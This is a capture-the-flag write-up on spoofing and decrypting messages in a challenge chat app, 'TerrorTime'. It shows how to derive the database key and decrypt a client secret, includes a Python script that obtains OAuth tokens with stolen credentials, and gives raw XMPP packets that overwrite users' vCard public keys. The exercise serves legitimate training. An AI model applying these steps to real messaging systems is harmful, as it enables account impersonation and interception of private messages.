# Task 6a - Message Spoofing - (Vulnerability Analysis; Cryptanalysis)

*The ability to masquerade as a TerrorTime user is helpful, even when we are not able to access the plaintext version of their messages. We want to be able to send "spoofed" messages (i.e., messages appearing to be from the user we are masquerading as) to other TerrorTime users as a way of disrupting their attack plans. Critically, any conversation we have as the masqueraded user should never be visible to that user the next time they access their account. But complicating matters is the fact that all messages sent and received through TerrorTime are archived on the chat server and downloaded each time a user logs in to their account. For this task, identify a vulnerabilty that will allow you to send/receive messages as a TerrorTime user without that user ever seeing those messages the next time they access their account. To prove your solution, submit the encrypted message body of a spoofed message that was sent from the organization leader to a cell leader. Submit the full client id of the cell leader you chose. Put the organization leader's account in a state such that replies to your spoofed message will never be seen by them, but still readable by you.*

## Solution

For this task, we need to find a vulnerability that will allow us to spoof a message as Hannah to Gittel without Hannah being able to see the message.

In order to spoof a message, we need to figure out how messages are encrypted and sent. Taking a look inside of `encryptMessage`, we can see what is going on for the non-obvious parts of the JSON from the message body.

```java
ref_00 = p1.iterator();
while (bVar1 = ref_00.hasNext(), bVar1 != false) {
    ref_01 = ref_00.next();
    checkCast(ref_01,PublicKey);
    pbVar3 = ref_01.getEncoded();
    ref_02 = CryptHelper.computeKeyFingerprint(pbVar3);
    pSVar4 = CryptHelper.wrapKey(ref_01,pOVar2);
    ref_07.put(ref_02,pSVar4);
}
```

There are two of these while loops for two different iterators. The while loop is going through each object as a public key and using it to create a fingerprint and a corresponding wrapped key, used to decrypt a message. If we look at `p1` and `p2` in the caller, these iterators are the sender's public keys and the recipeient's public keys. With this, we know that only the sender and receiver can decrypt the key that's needed to decypt the actual message. If we are able to manipulate public keys of a sender or receiever, we can choose who is able to read any given message. To figure out how keys are stored, we look at `getPublicKeys`.

```java
ref_00 = ref.getXMPPTCPConnection();
...
ref_00 = ref_02.getJidFromString(jid);
...
pEVar1 = ref_01.asEntityBareJidIfPossible();
pSVar2 = VCardHelper.getPublicKeys(pEVar1);
```

The code refers to user's client IDs as JIDs and uses a VCardHelper object to get the public keys for a JID. vCards, or Virtual Contact Files, are used as an electronic business card and are a standard used in XMPP. From this code, we can see that a user's public keys are stored in their vCard. Since we want to manipulate public keys, we will look at `savePublicKey` and `removePublicKey`. These methods would be ideal for changing someone's vCard. `savePublicKey` is called whenever a user is logged in, however, `removePublicKey` is not called anywhere. While TerrorTime won't be able to remove public keys, a different XMPP client may be able to.

We will use the [Spark](https://www.igniterealtime.org/downloads/index.jsp#spark) client because it can send and receive raw XMPP packets. In order to log in without the app though, we need to generate OAuth tokens and to do that we need to decrypt the client secret from the database. Looking back at `generateSymmetricKey`, we can see how the encryption key for storing data in the database is created.

```java
ref_04 = this.encryptPin;
ref = ref_04.getValue();
...
ref_05 = this.checkPin;
pbVar2 = ref_05.getValue();
...
ref_01 = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
pcVar4 = ref.toCharArray();
ref_06 = new KeySpec(pcVar4,pbVar2,0x2710,0x100);
ref_02 = ref_01.generateSecret(ref_06);
pbVar2 = ref_02.getEncoded();
ref_07 = new SecretKeySpec(pbVar2,"AES");
```

This shows that the app uses PBKDF2 to generate a key which is [recommended]((https://android-developers.googleblog.com/2013/02/using-cryptography-to-store-credentials.html)) by the Android developers blog as the highest security for storing credentials safely. (**Note**: This blog is slightly outdated and now SHA-256/10000 iterations is preferred over SHA-1/1000 iterations.) We can use a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Derive_PBKDF2_key(%7B'option':'UTF8','string':'207698'%7D,256,10000,'SHA256',%7B'option':'Hex','string':'1f86e51f7187772c1c7bb589299162e466f0c99d72abf4a2b04da03e9f70766e'%7D)) in order to generate the AES key and then use that key to decrypt anything in the database.

```
Passphrase: 207698
Key size: 256
Iterations: 10000
Hashing Function: SHA256
Salt: 1f86e51f7187772c1c7bb589299162e466f0c99d72abf4a2b04da03e9f70766e

Output: f25d144f98999dbc195263d031e4678f291f7cab32a32d3756e6dffb1ef097fb
```

Using this key to decrypt the data in the database for `csecret` we get `dKtjzdmMcGaH9I` which is the same length as the client secrets we found in task 1. With this, we can decrypt and encrypt anything for the database. We will now use the client secret to generate OAuth access tokens whenever we want.

```python
# oauth.py

import base64
import requests

token_url = "https://register.terrortime.app/oauth2/token"
client_id = "natalie--vhost-32@terrortime.app"
client_secret = "dKtjzdmMcGaH9I"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Authorization":"Basic " + base64.b64encode(f"{client_id}:{client_secret}".encode()).decode(),
    "X-Server-Select": "oauth"
}
data = {
    "audience": "",
    "grant_type": "client_credentials",
    "scope": "chat"
}

response = requests.post(token_url, headers=headers, data=data)
access_token = response.json()["access_token"]

print(access_token)
```

Using Hannah's client ID and a generated access token, we can login using Spark. When we are logged in, we can look closely at the packets sent and receieved. During this, we see the client requesting Hannah's vCard:

```
<iq to="hannah--vhost-32@terrortime.app/Spark" from="hannah--vhost-32@terrortime.app" id="6tcuX-23" type="result">
  <vCard xmlns="vcard-temp">
    <DESC>-----BEGIN PUBLIC KEY-----
MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQATr4oiwbLWo7RjAwp/GhI8
9e4BqWryLsBvM8DNqx37zbVITmEYoTPdxxfFUGHIelcT7MPftPsifHVm3eSjrdfr
xkFfJNPOhLTSO+48VEfwe8r1EwWAeD1DnGtAf96pDieGkrQ8RjA96fZFg0TCdLj/
yeV0K35MA0cB8cypYm6zkz4JTOANtV8+navU2gFjBvn28FU+S+XM2Oi/2BGK6ifF
CpPR3v5RzKtcFnMZ9zuqA5nukmANt10AQRecEgtgWQrQmmA07umNiOrWSOCApHl6
MmlJuUbmwo+kdvWlREcJrBCiToZmwTzwEc8AFwtpeMPU2jVerTUmNSwsubRfJlaP
AgMBAAE=
-----END PUBLIC KEY-----
    </DESC>
  </vCard>
</iq>
```

Since vCards are a standard, we can find [documentation](https://xmpp.org/extensions/xep-0054.html#sect-idm46144959876880) to change a vCard. For conveinence, we will change Hannah's public key to match Natalie's public key. To update, we send the following packet:

```
<iq id="v2" type="set">
  <vCard xmlns="vcard-temp">
    <DESC>-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1siJaZbaMsr9ErzcfTdi
L+0NszBs1FIVqXVlV9wRs6lqDnyq2d6+ikP5usk8wf3DB1pLsGbGSDtcnjrf8Ug7
4OAWazuK1d537lKN+rX5bIH/yGmOthBC4Q118UVobNl6c3IIVHuntb9p9C3YvKa0
WYF6HohWtfhQnCqy5cStm9d9aDNp9rxluDFecB8bR6vohFcwGQTHls794Rp4OXID
IJjozx9hBq0vL/al21GCnPu82PBbQ1MvltFbwP3GfKyk+aHfkpeixXindQc4/ntv
6qH45Wvy+aBmEhZfJsZL/ZlM+6kyLwuLMUbYfF6kymUSRfkeQ38djJvVKfY/dtac
4QIDAQAB
-----END PUBLIC KEY-----
    </DESC>
  </vCard>
</iq>
```

Now, until Hannah logs in again, she will not be able to see any new message sent to her or from her account. If we masquerade as Hannah, nothing will change because our public key matches her vCard. We can now send a message to any of the cell leaders and using mitm_relay again, we can see the encrypted body of the message which completes this task.

# Task 6b - Future Message Decryption - (Vulnerability Analysis; Cryptanalysis)

*Though we might be unable to decrypt messages sent and received in the past without a user's private key, it may still be possible to view future messages in the clear. For this task generate a new public/private key pair and make whatever changes are necessary such that all future messages sent/received within TerrorTime may be decrypted with this private key. Critically, you can not disrupt future legitimate conversations between users.*

## Solution

For this task, we need to find a vulnerability that will allow us to decrypt any future message sent/received using TerrorTime.

This task takes advantage of the same vulnerability as task 6a - we are able to manipulate the vCard for any user. Instead of removing public keys from a vCard, we are adding a new public key that we control to everyone's vCard. This works since the vCards support mulitple public keys. First we will generate a new key pair:

```
$ openssl genrsa -des3 -out private.pem 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
.............................................................+++++
.........................................................................+++++
e is 65537 (0x010001)
Enter pass phrase for private.pem:
Verifying - Enter pass phrase for private.pem:
$ openssl rsa -in private.pem -outform PEM -pubout -out public.pem
Enter pass phrase for private.pem:
writing RSA key
$ openssl rsa -in private.pem -out private_unencrypted.pem -outform PEM
```

In the database, we change the public key to our newly generated `public.pem`. When we login as a user, our new public key will get added to their vCard automatically. To complete this task, we login as every user discovered in task 5. Since we have the associated private key, we would now be able to view any future messages. To complete the task, we submit our public and private key.
